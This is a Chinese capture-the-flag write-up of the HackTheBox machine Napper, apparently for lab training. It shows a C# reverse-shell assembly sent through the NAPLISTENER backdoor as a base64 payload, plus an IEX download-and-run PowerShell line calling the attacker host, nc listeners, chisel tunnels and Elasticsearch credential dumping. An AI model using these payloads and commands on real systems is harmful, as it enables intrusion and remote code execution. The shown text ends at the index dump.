# 概述

​		浏览web服务上的博客内容，可以看到开启IIS的基本身份验证的介绍，里面提到了演示凭证，使用该凭证可以登录枚举到的另一个子域名站点。在另一个子域名站点上看到了有关NAPListENER的分析，利用NAPListENER获取出生立足点。

​		关于特权提升首先可以在web站点目录下发现一个a.exe的可执行文件，对他进行逆向分析得知它是用golang编写的，从main函数中，我看到程序调用获取elasticsearch中的“种子”进行随机化和编码，然后调用user-00001。一般来说，user-00001中的blob是加密后的用户名和密码，但它是不断变化的。一般来说，user-00001中的blob是加密后的用户名和密码，但它是不断变化的。利用chisel转发9200和9300到本地，可以获取a.exe中用来加密的seed和blob参数，然后解密获取用户密码。使用该密码切换到backup用户，该用户是administrator。



# 0x1、基础信息收集

## 1.1 端口扫描

1. 全TCP端口探测

   ```shell
   └─# nmap -sS -p- -Pn 10.10.11.240 --min-rate 1000 -oN tcp_port
   PORT     STATE SERVICE
   80/tcp   open  http
   443/tcp  open  https
   7680/tcp open  pando-pub
   ```

   

2. 全udp端口扫描

   ```shell
   └─# nmap -sU -p- -Pn 10.10.11.240 --min-rate 10000 -oN udp_port
   ```

   

3. 存活主机端口服务扫描

   ```sh
   └─# nmap -sV -sC -Pn -O -p80,443,7680 10.10.11.240 --min-rate 10000 -oN port_service
   PORT     STATE SERVICE    VERSION
   80/tcp   open  http       Microsoft IIS httpd 10.0
   |_http-title: Did not follow redirect to https://app.napper.htb
   |_http-server-header: Microsoft-IIS/10.0
   443/tcp  open  ssl/http   Microsoft IIS httpd 10.0
   |_http-server-header: Microsoft-IIS/10.0
   | tls-alpn: 
   |_  http/1.1
   |_ssl-date: 2023-11-15T02:26:35+00:00; -1s from scanner time.
   | ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
   | Subject Alternative Name: DNS:app.napper.htb
   | Not valid before: 2023-06-07T14:58:55
   |_Not valid after:  2033-06-04T14:58:55
   7680/tcp open  pando-pub?
   Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
   Device type: general purpose
   Running (JUST GUESSING): Microsoft Windows XP (88%)
   OS CPE: cpe:/o:microsoft:windows_xp::sp3
   Aggressive OS guesses: Microsoft Windows XP SP3 (88%)
   No exact OS matches for host (test conditions non-ideal).
   Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
   ```



## 1.2 TCP 80/443 HTTP/HTTPS

1. 添加`10.10.11.240 app.napper.htb`的dns映射到`/etc/hosts`中，由于已经发现存在子域名，因此尝试枚举一下子域名

   ```shell
   └─# wfuzz -c -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://napper.htb/ -H "Host: FUZZ.napper.htb"         
    /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
   ********************************************************
   * Wfuzz 3.1.0 - The Web Fuzzer                         *
   ********************************************************
   
   Target: http://napper.htb/
   Total requests: 19966
   
   =====================================================================
   ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                                                    
   =====================================================================
   
   000000001:   303        1 L      375 W       145 Ch      "www"                                                                                                                                                                                                                      
   000000039:   303        1 L      375 W       145 Ch      "dns2"     
   [snip]
   ```

   发现无效的子域名的相应字节内容是10，过滤一下无效的子域名输出

   ```sh
   └─# wfuzz -c -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://napper.htb/ -H "Host: FUZZ.napper.htb" --hw 375
   ```

   

2. 发现80和443端口上运行的是同一个服务，因此枚举任意一个即可。在等待子域名枚举期间枚举一下web子目录

   ```shell
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://app.napper.htb/  -t 50 --no-error --no-progress
   ```



3. 指纹识别，从站点标题来看似乎是一个博客，此外该静态站点是由Hugo 0.112.3生成的

   ```shell
   └─# whatweb http://app.napper.htb/
   http://app.napper.htb/ [303 See Other] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.240], Microsoft-IIS[10.0], RedirectLocation[https://app.napper.htb], Title[Document Moved]
   https://app.napper.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.240], MetaGenerator[Hugo 0.112.3], Microsoft-IIS[10.0], Open-Graph-Protocol[website], Script[text/javascript,text/x-mathjax-config], Title[Research Blog | Home], X-UA-Compatible[IE=edge]
   ```

   web服务器是Microsoft-IIS[10.0]，这应该是win 10，2016/2019 server。

   

   简单查看了一下目标站点，就是一个安全研究院的博客，没有找到有用的信息，由于是使用Hugo生成的静态站点，因此这在意料之中。

   

   google搜索Hugo 0.112.3的漏洞，发现Hugo 0.79.1 之前的版本中存在一个恶意命令执行的漏洞，[CVE-2020-26284](https://nvd.nist.gov/vuln/detail/CVE-2020-26284)，虽然与我们目标站点的Hugo版本不符合。



5. 枚举到了一个有效的子域名internal，

   ```
   └─# wfuzz -c -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://napper.htb/ -H "Host: FUZZ.napper.htb" --hw 375
    /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
   ********************************************************
   * Wfuzz 3.1.0 - The Web Fuzzer                         *
   ********************************************************
   
   Target: https://napper.htb/
   Total requests: 19966
   
   =====================================================================
   ID           Response   Lines    Word       Chars       Payload                                                                    
   =====================================================================
   
   000000387:   401        29 L     100 W      1293 Ch     "internal" 
   ```

   添加到/etc/hosts后访问，发现开启了基本上身份验证。

   ![image-20231115120241676](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161144983.png)



6. 仔细研究博客中的内容

   会在`https://app.napper.htb/posts/setup-basic-auth-powershell/`里介绍了利用powershell在IIS上开启基本身份验证。在步骤6中给了一个示例凭证`example：ExamplePassword`，使用该凭证成功登录了`https://internal.napper.htb/`



7. 浏览`https://internal.napper.htb/posts/first-re-research/`，这是一篇针对`NAPListENER`的研究说明。

   里面提到了`NAPListENER`是一个使用C#编写的后门

   ```
   [...] HTTP listener written in C#, which we refer to as NAPLISTENER. Consistent with SIESTAGRAPH and other malware families developed or used by this threat, NAPLISTENER appears designed to evade network-based forms of detection.  [...]
   
   [...] 用 C# 编写的 HTTP 侦听器，我们将其称为 NAPListENER。 与 SIESTAGRAPH 以及该威胁开发或使用的其他恶意软件系列一致，NAPLISTERER 似乎旨在逃避基于网络的检测。 [...]
   ```

   该后面应该是这样利用的

   ```
   This means that any web request to /ews/MsExgHealthCheckd/ that contains a base64-encoded .NET assembly in the sdafwe3rwe23 parameter will be loaded and executed in memory. It's worth noting that the binary runs in a separate process and it is not associated with the running IIS server directly.
   
   这意味着对 /ews/MsExgHealthCheckd/ 的任何 Web 请求（在 sdafwe3rwe23 参数中包含 base64 编码的 .NET 程序集）都将在内存中加载和执行。 值得注意的是，该二进制文件在单独的进程中运行，并且不与正在运行的 IIS 服务器直接关联。
   ```

   

# 0x2、获取出生立足点

## 2.1 NAPListENER利用

1. 首先研究一下NAPListENER，根据[这篇文章](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph)中所述，

   <img src="https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161145822.png" alt="image-20231115131501908" style="zoom:50%;" />

   尝试访问/ews/MsExgHealthCheckd/，从响应来看确定目标机器是NAPLISTENER的受害者

   <img src="https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161145344.png" alt="image-20231115131609929" style="zoom:80%;" />



2. 根据这篇[文章](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph)的分析， NAPLISTERNER 中的`Listener` 方法会在`/ews/MsExgHealthCheckd/`创建一个 `HttpListener` 对象来处理传入请求。当请求传入时，它会读取提交的任何数据（存储在 `Form` 字段中），从 Base64 格式对其进行解码，并使用解码后的数据创建一个新的 `HttpRequest` 对象。如果提交的 Form 字段包含 `sdafwe3rwe23` ，它将尝试创建一个程序集对象并使用 **`Run` 方法**执行它。这意味着对 `/ews/MsExgHealthCheckd/` 的任何 Web 请求（在 `sdafwe3rwe23` 参数中包含 Base64 编码的 .NET 程序集，可以理解成dll）都将在内存中加载和执行。

   

3. 首先来创建一个c# 的reverse shell，它下载远程的PowerShell脚本（来自[这里](https://raw.githubusercontent.com/martinsohn/PowerShell-reverse-shell/main/powershell-reverse-shell.ps1)，nishang的invoke-powershell-tcp在这边无法生效，我换用了GitHub上找到的其他资源）并在本地执行，这会为我提供一个reverser shell

   

   因为NAPLISTERNER是通过调用Run方法来执行我们的程序集的，所以C#程序集如下

   ```c#
   using System;
   using System.Diagnostics;
   using System.Net;
   
   namespace shell // <-- name file shell.cs
   {
       public class Run
       {
           public Run()
           {
               var scriptUrl = "http://10.10.14.16/Invoke-PowerShellTcp.ps1";
   
               using (WebClient webClient = new WebClient())
               {
                   // Download the PowerShell script from the URL
                   string scriptContent = webClient.DownloadString(scriptUrl);
   
                   var processStartInfo = new ProcessStartInfo("powershell.exe")
                   {
                       // Pass the downloaded script content as a command
                       Arguments = scriptContent,
                       RedirectStandardOutput = true,
                       RedirectStandardError = true,
                       UseShellExecute = false,
                       CreateNoWindow = true
                   };
   
                   var process = new Process
                   {
                       StartInfo = processStartInfo
                   };
   
                   process.Start();
   
               }
           }
   
           public static void Main(string[] args)
           {
   
           }
       }
   }
   ```

   在kali中编译shell.cs得到shell.exe

   ```bash
   └─# mcs shell.cs 
                                                                                                                                               
   ┌──(root㉿kali)-[~/…/AutoRecon/results/10.10.11.240/exploit]
   └─# ls
   exploit.py  Invoke-PowerShellTcp.ps1  port_service  shell.cs  shell.exe  tcp_port  udp_port
   ```



4. 接下来利用[这篇文章](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph)中的exploit.py来尝试利用NAPListENER

   ```python
   import requests
   from urllib3.exceptions import InsecureRequestWarning
   requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
   payload="TVqQAAMAAAAEAAAA//……………………AAA=="
   
   hosts =["napper.htb"]
   form_field=f"sdafwe3rwe23={requests.utils.quote(payload)}"
   for h in hosts:
           url_ssl= f"https://{h}/ews/MsExgHealthCheckd/"
           try:
                   r_ssl=requests.post(url_ssl,data=form_field,verify=False)
                   print(f"{url_ssl} : {r_ssl.status_code}{r_ssl.headers}")
           except KeyboardInterrupt:
                   exit()
           except Exception as e:
                   print(e)
                   pass
   ```

   首先修改这边的payload，它是由shell.exe进行base64编码得到。

   ```
   └─# cat shell.exe| base64 | tr -d '\n'
   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JAACAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAAAgAAAAKAACAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAABANQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= 
   ```

   使用上述base64编码的内容去替换exploit.py中的shellcode，然后运行exploit.py，这会给我们一个shell

   ```
   └─# nc -nvlp 4444
   listening on [any] 4444 ...
   connect to [10.10.16.3] from (UNKNOWN) [10.10.11.240] 50122
   SHELL> whoami
   napper\ruben
   ```

   

# 0x3、本地特权升级

## 3.1 Elasticsearch枚举

1. 在枚举之前，先使用nishang的Invoke-PowerShellTcp.ps1来获取熟悉的powershell交互

   ```shell
   SHELL> IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.16.3/Invoke-PowerShellTcp.ps1")
   
   
   └─# nc -nvlp 443                       
   listening on [any] 443 ...
   connect to [10.10.16.3] from (UNKNOWN) [10.10.11.240] 50151
   Windows PowerShell running as user ruben on NAPPER
   Copyright (C) 2015 Microsoft Corporation. All rights reserved.
   
   PS C:\users\ruben>
   ```

   

2. 使用Winpeasany.exe检索一下提权向量

   发现一个有趣的yml文件，它来自于C:\Program Files\elasticsearch-8.8.0，这不是一个常见的应用

   ![image-20231115163858959](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161145148.png)

   google没有发现该版本存在已知可以利用的漏洞。

   根据它在GitHub上的[仓库](https://github.com/elastic/elasticsearch)中的信息来看，Elasticsearch 对海量数据集执行实时搜索应用程序。该应用程序中可能包含敏感信息。

   

3. 枚举一下目标文件，检索password关键字，可以找到一个oKHzjZw0EGcRxT2cux5K的字符串，但无法利用它作为其他用户的密码切换到其他用户

   ```
   findstr /S /C:"password" "C:\Program Files\elasticsearch-8.8.0\data"
   ```

   ![image-20231115170531587](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161145851.png)



4. 在hacktricks上找到了测试[elasticsearch](https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch)的方法，查看一下目标机器的端口，确定运行了本地运行了Elasticsearch(9200和9300)

   ```
   C:\Program Files\elasticsearch-8.8.0>netstat -ano 
   netstat -ano
   
   Active Connections
   
     Proto  Local Address          Foreign Address        State           PID
     TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
     TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       892
     TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
     TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
     TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       4292
     TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       340
     TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       664
     TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       516
     TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1076
     TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1552
     TCP    0.0.0.0:50340          0.0.0.0:0              LISTENING       656
     TCP    10.10.11.240:139       0.0.0.0:0              LISTENING       4
     TCP    10.10.11.240:50232     10.10.16.3:4444        ESTABLISHED     1292
     TCP    10.10.11.240:50247     10.10.16.3:443         ESTABLISHED     1988
     TCP    10.10.11.240:50254     10.10.16.3:443         ESTABLISHED     1500
     TCP    10.10.11.240:50258     10.10.16.3:443         ESTABLISHED     4088
     TCP    10.10.11.240:50409     10.10.14.51:443        SYN_SENT        4828
     TCP    127.0.0.1:9200         0.0.0.0:0              LISTENING       4576
     TCP    127.0.0.1:9300         0.0.0.0:0              LISTENING       4576
     [snip]
   ```

   将这两个端口通过chisel转发到本地

   ```
   kali运行
   └─# ./chisel server -p 8000 --reverse
   
   目标机器运行
   C:\users\public\Downloads>chisel.exe client 10.10.16.3:8000 R:9200:127.0.0.1:9200
   C:\users\public\Downloads>chisel.exe client 10.10.16.3:8000 R:9300:127.0.0.1:9300
   
   确认转发成功
   └─# ./chisel server -p 8000 --reverse
   2023/11/15 19:56:01 server: Reverse tunnelling enabled
   2023/11/15 19:56:01 server: Fingerprint bfWPj6zF81YGeN4ZWN4ra4y0J/AUPuNXgV22n4UGegU=
   2023/11/15 19:56:01 server: Listening on http://0.0.0.0:8000
   2023/11/15 19:57:16 server: session#1: tun: proxy#R:9200=>9200: Listening
   2023/11/15 19:59:37 server: session#2: tun: proxy#R:9300=>9300: Listening
   ```

5. [elasticsearch](https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch#banner)手动枚举

   ①Banner

   ```
   └─# curl http://127.0.0.1:9200 -v
   *   Trying 127.0.0.1:9200...
   * Connected to 127.0.0.1 (127.0.0.1) port 9200
   > GET / HTTP/1.1
   > Host: 127.0.0.1:9200
   > User-Agent: curl/8.3.0
   > Accept: */*
   > 
   * Empty reply from server
   * Closing connection
   curl: (52) Empty reply from server
   ```

   没有访问成功，默认情况下，Elasticsearch 未启用身份验证，因此默认情况下您无需使用任何凭据即可访问数据库内的所有内容。这边访问没有内容可能是因为身份验证。

   

   ②身份验证

   通过以下请求来验证身份验证是否已禁用：

   ```
   curl -X GET "127.0.0.1:9200/_xpack/security/user/"
   ```

   虽然curl命令没有收到类似下列的响应，

   ```
   {"error":{"root_cause":[{"type":"exception","reason":"Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node."}],"type":"exception","reason":"Security must be explicitly enabled when using a [basic] license. Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node."},"status":500}
   ```

   但是我用nmap扫描本地的9200、9300端口的时候看到了类似响应。这边启用了身份验证

   ![image-20231116091115855](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161145026.png)

   根据hacktricks上的描述身份验证已配置，您需要有效的凭据才能从 elasticserach 获取任何信息。然后，您可以尝试对其进行暴力破解（它使用 HTTP 基本身份验证，因此可以使用 BF HTTP 基本身份验证的任何内容）。 这里有一个默认用户名列表：elastic (superuser)、remote_monitoring_user、beats_system、logstash_system、kibana、kibana_system、apm_system、_anonymous_._ 旧版本的 Elasticsearch 对此用户有默认密码更改。

   ```
   curl -X GET http://user:password@IP:9200/
   ```

   经过测试，使用默认用户elastic和之前在elasticsearch的data文件夹中找到的密码成功访问，这里看到了一个backupuser用户名

   ```
   └─# curl -k https://127.0.0.1:9200/ -u elastic:oKHzjZw0EGcRxT2cux5K
   {
     "name" : "NAPPER",
     "cluster_name" : "backupuser",
     "cluster_uuid" : "tWUZG4e8QpWIwT8HmKcBiw",
     "version" : {
       "number" : "8.8.0",
       "build_flavor" : "default",
       "build_type" : "zip",
       "build_hash" : "c01029875a091076ed42cdb3a41c10b1a9a5a20f",
       "build_date" : "2023-05-23T17:16:07.179039820Z",
       "build_snapshot" : false,
       "lucene_version" : "9.6.0",
       "minimum_wire_compatibility_version" : "7.17.0",
       "minimum_index_compatibility_version" : "7.0.0"
     },
     "tagline" : "You Know, for Search"
   }
   ```

    由于目标机器上的backup用户是administratork，猜测能在这里找到有关该用户的敏感信息

   ```
   C:\users\public\Downloads>net user backup
   net user backup
   User name                    backup
   Full Name                    backup
   Comment                      
   User's comment               
   Country/region code          000 (System Default)
   Account active               Yes
   Account expires              Never
   
   Password last set            11/15/2023 5:24:33 PM
   Password expires             Never
   Password changeable          11/15/2023 5:24:33 PM
   Password required            Yes
   User may change password     Yes
   
   Workstations allowed         All
   Logon script                 
   User profile                 
   Home directory               
   Last logon                   11/15/2023 2:57:11 PM
   
   Logon hours allowed          All
   
   Local Group Memberships      *Administrators       
   Global Group memberships     *None                 
   The command completed successfully.
   ```

   ③Indices

   收集访问 `http://127.0.0.1:9200/_cat/indices?v` 的所有索引

   ```
   └─# curl -k https://127.0.0.1:9200/_cat/indices?v -u elastic:oKHzjZw0EGcRxT2cux5K
   
   health status index      uuid                   pri rep docs.count docs.deleted store.size pri.store.size
   yellow open   seed       p72u8iIkS2utyMnYlJr9GQ   1   1          1            0      3.3kb          3.3kb
   yellow open   user-00001 Sag2SsYuTU-c7qTV9KabAA   1   1          1            0      5.4kb          5.4kb		
   ```

   要获取有关索引中保存哪种数据的信息，可以访问： `http://host:9200/<index>`

   ```
   └─# curl -k https://127.0.0.1:9200/user-00001 -u elastic:oKHzjZw0EGcRxT2cux5K
   
   {"user-00001":{"aliases":{},"mappings":{"properties":{"blob":{"type":"text","fields":{"keyword":{"type":"keyword","ignore_above":256}}},"timestamp":{"type":"date"}}},"settings":{"index":{"routing":{"allocation":{"include":{"_tier_preference":"data_content"}}},"number_of_shards":"1","provided_name":"user-00001","creation_date":"1700097573330","number_of_replicas":"1","uuid":"Sag2SsYuTU-c7qTV9KabAA","version":{"created":"8080099"}}}}} 
   ```

   

   ④转储index

   转储`seed`和``user-00001`两个index中的内容

   ```
   └─# curl -k -u elastic:oKHzjZw0EGcRxT2cux5K https://127.0.0.1:9200/seed/_search?pretty=true
   {
     "took" : 2,
     "timed_out" : false,
     "_shards" : {
       "total" : 1,
       "successful" : 1,
       "skipped" : 0,
       "failed" : 0
     },
     "hits" : {
       "total" : {
         "value" : 1,
         "relation" : "eq"
       },
       "max_score" : 1.0,
       "hits" : [
         {
           "_index" : "seed",
           "_id" : "1",
           "_score" : 1.0,
           "_source" : {
             "seed" : 77403965
           }
         }
       ]
     }
   }
   
   └─# curl -k -u elastic:oKHzjZw0EGcRxT2cux5K https://127.0.0.1:9200/user-00001/_search?pretty=true
   {
     "took" : 4,
     "timed_out" : false,
     "_shards" : {
       "total" : 1,
       "successful" : 1,
       "skipped" : 0,
       "failed" : 0
     },
     "hits" : {
       "total" : {
         "value" : 1,
         "relation" : "eq"
       },
       "max_score" : 1.0,
       "hits" : [
         {
           "_index" : "user-00001",
           "_id" : "yQa_1YsBA19PbpouanQR",
           "_score" : 1.0,
           "_source" : {
             "blob" : "o6Lj5njUseGJN4wsSb4elAWBs8g1Hj9gb_ErnhT5aIteqf-kwUbfI-8kB-MQ0e_WlWsMcUnu8_8=",
             "timestamp" : "2023-11-15T17:29:33.4362344-08:00"
           }
         }
       ]
     }
   }
   ```

